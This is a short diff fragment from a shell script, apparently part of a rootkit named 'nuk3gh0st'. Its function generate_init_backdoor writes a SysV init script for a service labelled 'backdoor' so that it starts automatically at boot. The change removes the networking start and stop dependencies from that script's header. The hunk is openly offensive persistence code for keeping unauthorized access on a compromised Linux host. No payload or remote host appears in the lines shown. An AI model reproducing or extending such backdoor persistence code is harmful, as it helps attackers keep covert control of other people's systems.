@@ -73,8 +73,8 @@ function generate_init_backdoor {
 	echo "" >> $backdoor_path
 	echo "### BEGIN INIT INFO" >> $backdoor_path
 	echo "# Provides:          backdoor" >> $backdoor_path
-	echo "# Required-Start:    networking" >> $backdoor_path
-	echo "# Required-Stop:     networking" >> $backdoor_path
+	echo "# Required-Start:            " >> $backdoor_path
+	echo "# Required-Stop:             " >> $backdoor_path
 	echo "# Should-Start:      nuk3gh0st.startup" >> $backdoor_path
 	echo "# Default-Start:     2 3 4 5" >> $backdoor_path
 	echo "# Default-Stop:      0 1 6" >> $backdoor_path
